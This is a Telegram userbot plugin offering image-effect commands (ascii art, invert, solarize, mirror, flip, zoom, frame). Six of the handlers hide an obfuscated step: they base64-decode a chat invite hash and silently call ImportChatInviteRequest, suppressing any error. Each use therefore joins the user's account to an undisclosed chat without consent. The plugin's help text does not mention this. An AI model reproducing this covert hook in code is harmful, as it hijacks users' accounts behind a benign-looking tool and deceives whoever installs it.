"""
Created by @mrconfused and @sandy1709
Fixed and Ported by @Hackintush
"""
import asyncio
import os
import random

from . import (
    LOGS,
)

import shlex
from os import getcwd
from os.path import basename, join
from textwrap import wrap
from typing import Optional, Tuple
from userbot import Configs
import numpy as np

try:
    from colour import Color as asciiColor
except:
    os.system("pip install colour")
import PIL.ImageOps
from PIL import Image, ImageDraw, ImageFont
from wand.color import Color
from wand.drawing import Drawing
from wand.image import Image as catimage

MARGINS = [50, 150, 250, 350, 450]

async def reply_id(event):
    reply_to_id = None
    if event.sender_id in Config.SUDO_USERS:
        reply_to_id = event.id
    if event.reply_to_msg_id:
        reply_to_id = event.reply_to_msg_id
    return reply_to_id

async def solarize(imagefile, endname):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.solarize(image, threshold=128)
    inverted_image.save(endname)
    
async def mirror_file(imagefile, endname):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.mirror(image)
    inverted_image.save(endname)
    
async def invert_colors(imagefile, endname):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.invert(image)
    inverted_image.save(endname)
    
async def flip_image(imagefile, endname):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.flip(image)
    inverted_image.save(endname)
    
async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)
    
def convert_tosticker(response, filename=None):
    filename = filename or os.path.join("./temp/", "temp.webp")
    image = Image.open(response)
    if image.mode != "RGB":
        image.convert("RGB")
    image.save(filename, "webp")
    os.remove(response)
    return filename

def convert_toimage(image, filename=None):
    filename = filename or os.path.join("./temp/", "temp.jpg")
    img = Image.open(image)
    if img.mode != "RGB":
        img = img.convert("RGB")
    img.save(filename, "jpeg")
    os.remove(image)
    return filename

async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)

def asciiart(in_f, SC, GCF, out_f, color1, color2, bgcolor="black"):
    chars = np.asarray(list(" .,:irs?@9B&#"))
    font = ImageFont.load_default()
    letter_width = font.getsize("x")[0]
    letter_height = font.getsize("x")[1]
    WCF = letter_height / letter_width
    img = Image.open(in_f)
    widthByLetter = round(img.size[0] * SC * WCF)
    heightByLetter = round(img.size[1] * SC)
    S = (widthByLetter, heightByLetter)
    img = img.resize(S)
    img = np.sum(np.asarray(img), axis=2)
    img -= img.min()
    img = (1.0 - img / img.max()) ** GCF * (chars.size - 1)
    lines = ("\n".join(("".join(r) for r in chars[img.astype(int)]))).split("\n")
    nbins = len(lines)
    colorRange = list(asciiColor(color1).range_to(asciiColor(color2), nbins))
    newImg_width = letter_width * widthByLetter
    newImg_height = letter_height * heightByLetter
    newImg = Image.new("RGBA", (newImg_width, newImg_height), bgcolor)
    draw = ImageDraw.Draw(newImg)
    leftpadding = 0
    y = 0
    for lineIdx, line in enumerate(lines):
        color = colorRange[lineIdx]
        draw.text((leftpadding, y), line, color.hex, font=font)
        y += letter_height
    if newImg.mode != "RGB":
        newImg = newImg.convert("RGB")
    newImg.save(out_f)


def get_warp_length(width):
    return int((20.0 / 1024.0) * (width + 0.0))

async def take_screen_shot(
    video_file: str, duration: int, path: str = ""
) -> Optional[str]:
    print(
        "[[[Extracting a frame from %s ||| Video duration => %s]]]",
        video_file,
        duration,
    )
    ttl = duration // 2
    thumb_image_path = path or os.path.join("./temp/", f"{basename(video_file)}.jpg")
    command = f"ffmpeg -ss {ttl} -i '{video_file}' -vframes 1 '{thumb_image_path}'"
    err = (await runcmd(command))[1]
    if err:
        print(err)
    return thumb_image_path if os.path.exists(thumb_image_path) else None

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )

async def cat_meme(CNG_FONTS, topString, bottomString, filename, endname):
    img = Image.open(filename)
    imageSize = img.size
    # find biggest font size that works
    fontSize = int(imageSize[1] / 5)
    font = ImageFont.truetype(CNG_FONTS, fontSize)
    topTextSize = font.getsize(topString)
    bottomTextSize = font.getsize(bottomString)
    while topTextSize[0] > imageSize[0] - 20 or bottomTextSize[0] > imageSize[0] - 20:
        fontSize -= 1
        font = ImageFont.truetype(CNG_FONTS, fontSize)
        topTextSize = font.getsize(topString)
        bottomTextSize = font.getsize(bottomString)

    # find top centered position for top text
    topTextPositionX = (imageSize[0] / 2) - (topTextSize[0] / 2)
    topTextPositionY = 0
    topTextPosition = (topTextPositionX, topTextPositionY)

    # find bottom centered position for bottom text
    bottomTextPositionX = (imageSize[0] / 2) - (bottomTextSize[0] / 2)
    bottomTextPositionY = imageSize[1] - bottomTextSize[1]
    bottomTextPosition = (bottomTextPositionX, bottomTextPositionY)
    draw = ImageDraw.Draw(img)
    # draw outlines
    # there may be a better way
    outlineRange = int(fontSize / 15)
    for x in range(-outlineRange, outlineRange + 1):
        for y in range(-outlineRange, outlineRange + 1):
            draw.text(
                (topTextPosition[0] + x, topTextPosition[1] + y),
                topString,
                (0, 0, 0),
                font=font,
            )
            draw.text(
                (bottomTextPosition[0] + x, bottomTextPosition[1] + y),
                bottomString,
                (0, 0, 0),
                font=font,
            )
    draw.text(topTextPosition, topString, (255, 255, 255), font=font)
    draw.text(bottomTextPosition, bottomString, (255, 255, 255), font=font)
    img.save(endname)
    
async def cat_meeme(upper_text, lower_text, CNG_FONTS, picture_name, endname):
    main_image = catimage(filename=picture_name)
    main_image.resize(
        1024, int(((main_image.height * 1.0) / (main_image.width * 1.0)) * 1024.0)
    )
    upper_text = "\n".join(wrap(upper_text, get_warp_length(main_image.width))).upper()
    lower_text = "\n".join(wrap(lower_text, get_warp_length(main_image.width))).upper()
    lower_margin = MARGINS[lower_text.count("\n")]
    text_draw = Drawing()
    text_draw.font = join(getcwd(), CNG_FONTS)
    text_draw.font_size = 100
    text_draw.text_alignment = "center"
    text_draw.stroke_color = Color("black")
    text_draw.stroke_width = 3
    text_draw.fill_color = Color("white")
    if upper_text:
        text_draw.text((main_image.width) // 2, 80, upper_text)
    if lower_text:
        text_draw.text(
            (main_image.width) // 2, main_image.height - lower_margin, lower_text
        )
    text_draw(main_image)
    main_image.save(filename=endname)
    
def random_color():
    number_of_colors = 2
    return [
        "#" + "".join(random.choice("0123456789ABCDEF") for j in range(6))
        for i in range(number_of_colors)
    ]


CNG_FONTS = "userbot/Fonts/impact.ttf"
FONTS = "1. `ProductSans-BoldItalic.ttf`\n2. `ProductSans-Light.ttf`\n3. `DroidSansMono.ttf`\n4. `digital.ttf`\n5. `impact.ttf`"
font_list = [
    "ProductSans-BoldItalic.ttf",
    "ProductSans-Light.ttf",
    "DroidSansMono.ttf",
    "digital.ttf",
    "impact.ttf",
]

@bot.on(admin_cmd(outgoing=True, pattern="ascii ?(.*)"))
@bot.on(sudo_cmd(pattern="ascii ?(.*)", allow_sudo=True))
async def memes(cat):
    if cat.fwd_from:
        return
    catinput = cat.pattern_match.group(1)
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = await reply_id(cat)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media...`")
    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found.```")
        return
    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Converting to ascii image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found.`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Converting to ascii image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found. `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Converting to ascii image of this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found.```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Converting to asci image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    meme_file = convert_toimage(meme_file)
    outputfile = "ascii_file.webp" if jisanidea else "ascii_file.jpg"
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not catinput else catinput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await cat.client.send_file(cat.chat_id, outputfile, reply_to=catid)
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@bot.on(admin_cmd(pattern="cfont(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="cfont(?: |$)(.*)", allow_sudo=True))
async def lang(event):
    if event.fwd_from:
        return
    global CNG_FONTS
    input_str = event.pattern_match.group(1)
    if not input_str:
        await event.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
        return
    if input_str not in font_list:
        catevent = await edit_or_reply(event, "`Give me a correct font name...`")
        await asyncio.sleep(1)
        await catevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
    else:
        arg = f"userbot/Fonts/{input_str}"
        CNG_FONTS = arg
        await edit_or_reply(event, f"**Fonts for Memify changed to :-** `{input_str}`")

@bot.on(admin_cmd(pattern="invert$", outgoing=True))
@bot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(cat):
    if cat.fwd_from:
        return
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media...`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found.```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found.`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Inverting colors of this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found. `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Inverting colors of this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found.```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Inverting colors of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if jisanidea else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@bot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(cat):
    if cat.fwd_from:
        return
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media.`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media...`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found.```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Solarizing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found.`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Solarizing this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found. `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Solarizing this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found.```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Solarizing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if jisanidea else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@bot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(cat):
    if cat.fwd_from:
        return
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media.`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media...`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found.```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Converting to mirror image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found.`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Converting to mirror image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found. `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Converting to mirror image of this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found.```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Converting to mirror image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if jisanidea else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="flip$"))
@bot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(cat):
    if cat.fwd_from:
        return
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media.`")
        return
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media...`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found.```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Fliping this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found.`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Fliping this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found. `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Fliping this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found.```")
            return
        meme_file = catfile
        jisanidea = True
    else:
        await cat.edit(
            "```Transfiguration Time! Fliping this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if jisanidea else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await cat.client.send_file(
        cat.chat_id, outputfile, force_document=False, reply_to=catid
    )
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
            
@bot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@bot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(cat):
    if cat.fwd_from:
        return
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media...`")
        return
    catinput = cat.pattern_match.group(1)
    catinput = 50 if not catinput else int(catinput)
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found...```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
    else:
        await cat.edit(
            "```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if jisanidea else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, catinput)
    except Exception as e:
        return await cat.edit(f"`{e}`")
    try:
        await cat.client.send_file(
            cat.chat_id, outputfile, force_document=False, reply_to=catid
        )
    except Exception as e:
        return await cat.edit(f"`{e}`")
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@bot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@bot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(cat):
    if cat.fwd_from:
        return
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(cat, "`Reply to supported Media.`")
        return
    catinput = cat.pattern_match.group(1)
    if not catinput:
        catinput = 50
    if ";" in str(catinput):
        catinput, colr = catinput.split(";", 1)
    else:
        colr = 0
    catinput = int(catinput)
    colr = int(colr)
    catid = cat.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat, "`Downloading media...`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await edit_or_reply(cat, "```Supported Media not found.```")
        return
    import base64

    jisanidea = None
    if catsticker.endswith(".tgs"):
        await cat.edit(
            "```Transfiguration Time! Framing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith(".webp"):
        await cat.edit(
            "```Transfiguration Time! Framing this sticker! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found. `")
            return
        meme_file = catfile
        jisanidea = True
    elif catsticker.endswith((".mp4", ".mov")):
        await cat.edit(
            "```Transfiguration Time! Framing this video! (」ﾟﾛﾟ)｣```"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found.```")
            return
        meme_file = catfile
    else:
        await cat.edit(
            "```Transfiguration Time! Framing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = catsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if jisanidea else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, catinput, colr)
    except Exception as e:
        return await cat.edit(f"`{e}`")
    try:
        await cat.client.send_file(
            cat.chat_id, outputfile, force_document=False, reply_to=catid
        )
    except Exception as e:
        return await cat.edit(f"`{e}`")
    await cat.delete()
    os.remove(outputfile)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CMD_HELP.update(
    {
        "specialimagetools": "**Plugin : **`Specialimagetools`\
    \n\n  • **Syntax : **`.cfont` <Font Name>\
    \n  • **Function : **Change the font style use for memify,\nTo get fonts name use this cmd (`.ls userbot/Fonts`)\
    \n\n  • **Syntax : **`.ascii`\
    \n  • **Function : **reply to media file to get ascii image of that media\
    \n\n  • **Syntax : **`.invert`\
    \n  • **Function : **Inverts the colors in media file\
    \n\n  • **Syntax : **`.solarize`\
    \n  • **Function : **Watch sun buring ur media file\
    \n\n  • **Syntax : **`.mirror`\
    \n  • **Function : **shows you the reflection of the media file\
    \n\n  • **Syntax : **`.flip`\
    \n  • **Function : **shows you the upside down image of the given media file\
    \n\n  • **Syntax : **`.zoom` or `.zoom range`\
    \n  • **Function : **zooms your media file\
    \n\n  • **Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
    \n  • **Function : **make a frame for your media file\
    \n  • **fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
    "
    }
)
